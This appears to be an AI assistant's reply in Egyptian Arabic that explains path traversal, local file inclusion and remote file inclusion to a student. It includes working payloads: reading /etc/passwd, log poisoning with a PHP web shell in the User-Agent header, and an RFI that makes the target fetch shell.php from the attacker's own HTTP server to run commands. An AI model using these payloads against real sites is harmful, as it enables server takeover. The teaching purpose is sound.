تمام! فهمت اللي بتقوله. 🎯

خليني أعيد الشرح بشكل أوضح وأبسط، وهرتب الكلام عشان تعرف تقرأه من فين لفين.

---

# الفرق بين الثلاثة — من الأبسط للأخطر

---

## 🟡 الأول — Path Traversal



الموقع بيسمحلك تطلب ملف، وأنت بتتلاعب في المسار عشان توصل لملفات تانية.

السيرفر بيجيب الملف ويبعهولك **كنص** — مش بيشغله.

### مثال واضح:

تخيل موقع بيحمّل صور هكذا:

```
site.com/download?file=cat.jpg
```

السيرفر بيفتح الملف ده:

```
/var/www/images/cat.jpg
```

لو حطيت `../` بدل اسم الصورة:

```
site.com/download?file=../../../etc/passwd
```

السيرفر هيفتح:

```
/etc/passwd
```

وهيبعهولك **كنص عادي** تقرأه.

### النقطة المهمة:

```
Path Traversal = قراءة فقط
السيرفر بيعرض الملف كنص
مش بيشغله ولا بيعمل run
```

---

## 🔴 الثاني — LFI (Local File Inclusion)



هنا الموقع مش بس بيقرأ الملف — هو بيعمل **include** للملف. يعني بيضمّه جوه الكود ويشغّله.

الـ **Include** (إنكلود) معناها: السيرفر بيجيب الملف ويحطه جوه الصفحة ويشغّله كأنه جزء من الكود.

### الفرق العملي:

```
Path Traversal:
بيجيب الملف ← بيعرضه كنص ← خلاص

LFI:
بيجيب الملف ← بيشغّله جوه الكود ← خطير أكتر
```

### مثال واضح:

موقع بيعرض صفحات هكذا:

```
site.com/index.php?page=home
site.com/index.php?page=about
```

الكود بتاع الموقع بيعمل كده:

```php
include( $_GET['page'] . ".php" );
```

يعني بياخد اللي إنت كتبته ويعمله include.

لو كتبت:

```
site.com/index.php?page=../../../etc/passwd
```

السيرفر هيعمل:

```php
include("/etc/passwd");
```

ده هيعرض محتوى الملف جوه الصفحة.

### اللي قاله الدكتور صح:

في الـ LFI إنت بترفع ملف على السيرفر أو بتلاقي ملف موجود عليه، وبتخلي السيرفر يعمله include. لو الملف ده فيه كود PHP مثلاً، السيرفر هيشغّله وممكن تفتح Shell.

### مثال على ده:

السيرفر بيسجل كل الـ Requests في ملف اسمه access.log هكذا:

```
/var/log/apache2/access.log
```

إنت بتبعت Request وتحط فيه كود PHP:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

السيرفر بيكتب الكود ده في الـ Log.

بعدين بتعمل LFI على ملف الـ Log:

```
site.com/index.php?page=../../../var/log/apache2/access.log&cmd=whoami
```

السيرفر بيعمل include للـ Log، الكود اللي فيه بيتشغل، وبيجيب النتيجة. ده اللي بيسموه **RCE** (آر سي إي) يعني **Remote Code Execution** — تنفيذ كود على السيرفر.

---

## 💣 الثالث — RFI (Remote File Inclusion)

### بالعربي البسيط:

نفس فكرة الـ LFI بالظبط، بس بدل ما الملف يكون على السيرفر، الملف بيكون **على سيرفرك إنت** على النت.

الـ **Remote** (ريموت) معناها: بعيد أو خارجي.

### اللي قاله الدكتور صح:

إنت بتجهّز ملف فيه كود خبيث على سيرفرك أنت، وبتخلي الموقع يعمل include للملف ده عن طريق الـ URL بتاعه.

### مثال واضح:

إنت عندك على جهازك ملف اسمه shell.php فيه:

```php
<?php system($_GET['cmd']); ?>
```

شغّلت HTTP Server على جهازك:

```bash
python3 -m http.server 80
```

بعتّ الـ Request ده للموقع:

```
site.com/index.php?page=http://جهازك/shell
```

السيرفر راح على جهازك، جاب ملف shell.php، وعمله include وشغّله على نفسه.

دلوقتي تقدر تنفذ أي أمر:

```
site.com/index.php?page=http://جهازك/shell&cmd=whoami
site.com/index.php?page=http://جهازك/shell&cmd=ls /
```

---

## الفرق بين الثلاثة في جدول واضح

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│  Path Traversal                                     │
│  بيعمل إيه؟   بيقرأ الملف كنص بس                  │
│  مثال:        download?file=../../etc/passwd        │
│  النتيجة:     بتشوف محتوى الملف كنص عادي           │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  LFI                                                │
│  بيعمل إيه؟   بيضمّن ملف محلي ويشغّله             │
│  مثال:        page=../../etc/passwd                 │
│               أو page=../../var/log/access.log      │
│  النتيجة:     الملف بيتشغل جوه الصفحة              │
│               ممكن توصل لـ RCE                      │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  RFI                                                │
│  بيعمل إيه؟   بيضمّن ملف من سيرفرك إنت           │
│  مثال:        page=http://جهازك/shell.php           │
│  النتيجة:     كودك بيتشغل على السيرفر              │
│               RCE مباشر                             │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## القاعدة الذهبية اللي قالها الشات

```
لو الملف بيتعرض كنص جوه الصفحة
→ LFI

لو الملف بيتنزل أو بيتفتح لوحده
→ Path Traversal

لو الملف بييجي من سيرفر خارجي
→ RFI
```

---

## الترتيب من الأبسط للأخطر

```
Path Traversal
     ↓ أخطر
LFI
     ↓ أخطر
RFI
     ↓ النتيجة النهائية للاتنين
RCE (تتحكم في السيرفر)
```

---

## ملخص نهائي بكلمات بسيطة

**Path Traversal:** بتوصل للملف وبتقرأه كنص. السيرفر مش بيشغله.

**LFI:** بتوصل للملف والسيرفر بيشغّله. لو عرفت تحط كود في ملف على السيرفر، تقدر تتحكم فيه.

**RFI:** بتجيب ملفك أنت من الإنترنت والسيرفر بيشغّله. أخطر نوع لأن الكود بتاعك إنت بيتنفذ على السيرفر.

---

فيه حاجة مش واضحة تقولي عليها؟ 🔍